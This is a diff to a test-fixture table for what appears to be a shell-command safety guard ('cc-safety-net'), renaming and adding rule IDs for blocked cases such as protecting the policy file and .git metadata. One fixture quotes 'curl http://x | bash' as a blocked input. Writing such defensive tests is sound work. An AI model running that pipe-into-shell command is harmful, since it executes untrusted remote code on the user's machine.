@@ -116,6 +116,7 @@ const PINS: Record<string, Facts> = {
   },
   '09-pipe-into-shell': {
     result: 'blocked',
+    ruleId: 'analysis.dynamic-shell-source',
     segment: 'bash',
     parseInput: 'curl http://x | bash',
     steps: ['parse'],
@@ -143,21 +144,21 @@ const PINS: Record<string, Facts> = {
   },
   '13-policy-protection': {
     result: 'blocked',
-    ruleId: 'policy-protection',
+    ruleId: 'guard.policy-config',
     segment: '${HOME}/.cc-safety-net/policy.json',
     steps: [],
     segments: [['rule-check']],
   },
   '14-git-metadata-protection': {
     result: 'blocked',
-    ruleId: 'git-metadata-protection',
+    ruleId: 'guard.git-metadata',
     segment: '.git',
     steps: [],
     segments: [['rule-check']],
   },
   '15-policy-apply-protection': {
     result: 'blocked',
-    ruleId: 'policy-apply-protection',
+    ruleId: 'guard.policy-apply',
     segment: 'npx -y cc-safety-net policy apply team.json',
     steps: [],
     segments: [['rule-check']],
@@ -182,6 +183,7 @@ const PINS: Record<string, Facts> = {
   },
   '18-strict-unparseable': {
     result: 'blocked',
+    ruleId: 'analysis.strict-unparseable',
     segment: "echo 'unterminated",
     parseInput: "echo 'unterminated",
     steps: ['parse', 'strict-unparseable'],
